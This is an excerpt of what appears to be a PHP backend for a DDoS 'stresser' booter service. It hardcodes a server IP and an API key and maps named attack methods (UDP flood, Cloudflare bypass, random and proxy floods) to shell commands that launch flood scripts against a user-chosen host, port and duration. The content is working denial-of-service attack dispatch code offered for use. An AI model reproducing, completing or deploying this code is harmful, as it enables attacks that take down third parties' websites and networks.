...
//////////////////////////////////////////
$server_ip = "84.252.121.101"; //Change "1337" to your servers IP.
...
///////////////////////////////////////////////////
$array = array("UDP", "cfbypass", "cfbypassv2", "rand", "proxy", "stop");// Add you're existing methods here, and delete you're none existent methods.
$ray = array("strongstresserapigmi");
...
//////////////////////////////////////////////////////////////////////////////
if ($method == "cfbypass") { $command = "screen -dm node /root/CFBypass.js $host $time"; }
if ($method == "cfbypassv2") { $command = "screen -dm node /root/CFSockets.js $host $time"; }
if ($method == "UDP") { $command = "screen -dm perl /root/ivanbul85.pl $host $port 50000 $time"; }
if ($method == "rand") { $command = "screen -dm node /root/rand.js $host $time"; }
if ($method == "proxy") { $command = "screen -dm node /root/SpaceX.js $host $time"; }
